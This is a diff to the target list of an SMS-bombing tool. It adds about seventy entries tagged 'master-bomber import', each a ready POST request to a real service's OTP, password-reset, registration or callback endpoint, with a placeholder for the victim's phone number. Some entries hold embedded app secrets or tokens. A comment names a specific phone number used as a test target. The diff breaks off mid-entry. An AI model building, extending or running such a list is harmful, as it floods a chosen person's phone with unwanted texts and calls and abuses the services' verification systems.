@@ -3139,7 +3139,9 @@
           202,
           204
         ]
-      }
+      },
+      "enabled": false,
+      "note": "disabled: API success but no SMS delivered to +79313995224"
     },
     {
       "name": "bomberapi-aptekaapril",
@@ -3332,6 +3334,2931 @@
           204
         ]
       }
+    },
+    {
+      "name": "mb2-0-my.telegram.org",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://my.telegram.org/auth/send_password",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{e164}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-1-pizzahut.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://pizzahut.ru/account/password-reset",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "reset_by": "phone",
+        "action_id": "pass-recovery",
+        "phone": "{digits}",
+        "_token": ""
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-2-mobile-api.qiwi.com",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://mobile-api.qiwi.com/oauth/authorize",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
+        "username": "{digits}",
+        "client_id": "android-qw",
+        "client_secret": "zAm4FKq9UnSe7id"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-3-www.rabota.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.rabota.ru/remind",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "credential": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-4-comfy.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://comfy.ua/ua/customer/account/createPost",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "registration_name": "Ivan",
+        "registration_phone": "{digits}",
+        "registration_email": "test{ts}@mail.ru"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-5-rutube.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://rutube.ru/api/accounts/sendpass/phone",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{e164}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-6-3040.com.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://3040.com.ua/taxi-ordering",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "callback-phone": "{e164}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-7-alfalife.cc",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://alfalife.cc/auth.php",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{e164}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-8-allo.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main¤tLocale=uk_UA",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "firstname": "Ivan",
+        "telephone": "{digits}",
+        "email": "test{ts}@mail.ru",
+        "password": "Pac{code}!Aa",
+        "form_key": "Zqqj7CyjkKG2ImM8"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-9-www.citilink.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.citilink.ru/registration/confirm/phone/{e164}/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-10-www.sportmaster.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={e164}",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-11-www.oyorooms.com",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.oyorooms.com/api/pwa/generateotp?phone={e164}&country_code=%2B7&nod=4&locale=en",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-12-secure.online.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://secure.online.ua/ajax/check_phone/?reg_phone={digits}",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-13-pampik.com",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://pampik.com/callback",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phoneCallback": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-14-junker.kiev.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://junker.kiev.ua/postmaster.php",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "tel": "{digits}",
+        "name": "Ivan",
+        "action": "callme"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-15-mobileplanet.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://mobileplanet.ua/new_record",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "klient_name": "Ivan",
+        "klient_phone": "{e164}",
+        "object": "callback",
+        "this_page_url": "https://mobileplanet.ua/telefony-349"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-16-holdyou.net",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://holdyou.net/api/callback",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "name": "Ivan",
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-17-city24.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://city24.ua/personalaccount/account/registration",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "PhoneNumber": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-18-my.dianet.com.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://my.dianet.com.ua/send_sms/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-19-api.easypay.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://api.easypay.ua/api/auth/register",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}",
+        "password": "Pac{code}!Aa"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-20-vladimir.edostav.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://vladimir.edostav.ru/site/CheckAuthLogin",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone_or_email": "{e164}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-21-api.eldorado.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://api.eldorado.ua/v1/sign?login={digits}&step=phone-check&fb_id=null&fb_token=null&lang=ru",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-22-www.etm.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.etm.ru/cat/runprog.html",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "m_phone": "{digits}",
+        "mode": "sendSms",
+        "syf_prog": "clients-services",
+        "getSysParam": "yes"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-23-www.finam.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.finam.ru/api/smslocker/sendcode",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{e164}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-24-foodband.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://foodband.ru/api?phone={digits}&call=customers/sendVerificationCode&g-recaptcha-response=",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-25-friendsclub.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://friendsclub.ru/assets/components/pl/connector.php",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "MobilePhone": "{e164}",
+        "casePar": "authSendsms"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-26-crm.getmancar.com.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://crm.getmancar.com.ua/api/veryfyaccount",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-27-www.hatimaki.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.hatimaki.ru/register/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "REGISTER[LOGIN]": "{digits}",
+        "REGISTER[PERSONAL_PHONE]": "{digits}",
+        "REGISTER[SMS_CODE]": "",
+        "resend-sms": "1",
+        "REGISTER[EMAIL]": "test{ts}@mail.ru",
+        "register_submit_button": "Зарегистрироваться"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-28-helsi.me",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://helsi.me/api/healthy/accounts/login",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}",
+        "platform": "PISWeb"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-29-api.hmara.tv",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://api.hmara.tv/stable/entrance?contact={digits}",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-30-api.imgur.com",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://api.imgur.com/account/v1/phones/verify",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone_number": "{digits}",
+        "region_code": "RU"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-31-terra-1.indriverapp.com",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://terra-1.indriverapp.com/api/authorization?locale=ru",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{e164}",
+        "mode": "request",
+        "phone_permission": "unknown",
+        "stream_id": 0,
+        "v": 3,
+        "appversion": "3.20.6",
+        "osversion": "unknown",
+        "devicemodel": "unknown"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-32-informatics.yandex",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://informatics.yandex/api/v1/registration/confirmation/phone/send/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}",
+        "csrfmiddlewaretoken": "",
+        "country": {
+          "7": "RU",
+          "380": "UA",
+          "375": "BE"
+        }
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-33-lk.invitro.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "login": "{e164}",
+        "password": "Pac{code}!Aa",
+        "application": "lkp"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-34-izi.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://izi.ua/api/auth/register",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-35-izi.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://izi.ua/api/auth/sms-login",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-36-kaspi.kz",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://kaspi.kz/util/send-app-link",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "address": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-37-api.kinoland.com.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://api.kinoland.com.ua/api/v1/service/send-sms",
+      "enabled": true,
+      "countries": [],
+      "headers": {
+        "Agent": "website"
+      },
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-38-koronapay.com",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://koronapay.com/transfers/online/api/users/otps",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-39-loany.com.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://loany.com.ua/funct/ajax/registration/code",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-40-api-rest.logistictech.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://api-rest.logistictech.ru/api/v1.1/clients/request-code",
+      "enabled": true,
+      "countries": [],
+      "headers": {
+        "Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9"
+      },
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-41-makarolls.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "data": "{digits}",
+        "metod": "postreg"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-42-www.menu.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.menu.ua/kiev/delivery/registration/direct-registration.html",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "user_info[phone]": "{digits}",
+        "user_info[fullname]": "Ivan",
+        "user_info[email]": "test{ts}@mail.ru",
+        "user_info[password]": "ndD34f!dfg#",
+        "user_info[conf_password]": "ndD34f!dfg#"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-43-www.menu.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.menu.ua/kiev/delivery/profile/show-verify.html",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}",
+        "do": "phone"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-44-menza-cafe.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://menza-cafe.ru/system/call_me.php",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}",
+        "phone_number": "1",
+        "fio": "Ivan"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-45-my.mistercash.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://my.mistercash.ua/ru/send/sms/registration?number={e164}",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-46-my.modulbank.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://my.modulbank.ru/api/v2/registration/nameAndPhone",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-47-www.monobank.com.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.monobank.com.ua/api/mobapplink/send",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{e164}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-48-my.dianet.com.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://my.dianet.com.ua/send_sms/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-49-www.moyo.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.moyo.ua/identity/registration",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}",
+        "firstname": "Ivan",
+        "email": "test{ts}@mail.ru"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-50-prod.tvh.mts.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code?msisdn={digits}",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-51-auth.multiplex.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://auth.multiplex.ua/login",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-52-my.dianet.com.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://my.dianet.com.ua/send_sms/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-53-www.niyama.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.niyama.ru/ajax/sendSMS.php",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-54-my.dianet.com.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://my.dianet.com.ua/send_sms/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "REGISTER[PERSONAL_PHONE]": "{digits}",
+        "code": "",
+        "sendsms": "Выслать код"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-55-www.nl.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.nl.ua",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}",
+        "method": "sendCode",
+        "registration": "N",
+        "sessid": "bf70db951f54b837748f69b75a61deb4",
+        "component": "bxmaker.authuserphone.login"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-56-nn-card.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://nn-card.ru/api/1.0/covid/login",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-57-secure.online.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://secure.online.ua/ajax/check_phone?reg_phone={digits}",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-58-piroginomerodin.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://piroginomerodin.ru/index.php?route=sms/login/sendreg",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "telephone": "{e164}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-59-cabinet.planetakino.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://cabinet.planetakino.ua/service/sms?phone={digits}",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-60-www.prosushi.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.prosushi.ru/php/profile.php",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{e164}",
+        "mode": "sms"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-61-oapi.raiffeisen.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code?number={digits}",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-62-richfamily.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{e164}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-63-rieltor.ua",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://rieltor.ua/api/users/register-sms/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}",
+        "retry": 0
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-64-sayoris.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://sayoris.ru/?route=parse/whats",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{digits}"
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-65-shopandshow.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://shopandshow.ru/sms/password-request/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": {
+        "phone": "{e164}",
+        "resend": 0
+      },
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-66-smart.space",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://smart.space/api/users/request_confirmation_code/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-67-suandshi.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://suandshi.ru/mobile_api/register_mobile_user?phone={digits}",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-68-client-api.sushi-master.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://client-api.sushi-master.ru/api/v1/auth/init",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
+      "name": "mb2-69-www.sushi-profi.ru",
+      "kind": "otp",
+      "method": "POST",
+      "url": "https://www.sushi-profi.ru/api/order/order-call/",
+      "enabled": true,
+      "countries": [],
+      "headers": {},
+      "body_type": "json",
+      "body": null,
+      "success": {
+        "status": [
+          200,
+          201,
+          202,
+          204
+        ]
+      },
+      "note": "master-bomber import"
+    },
+    {
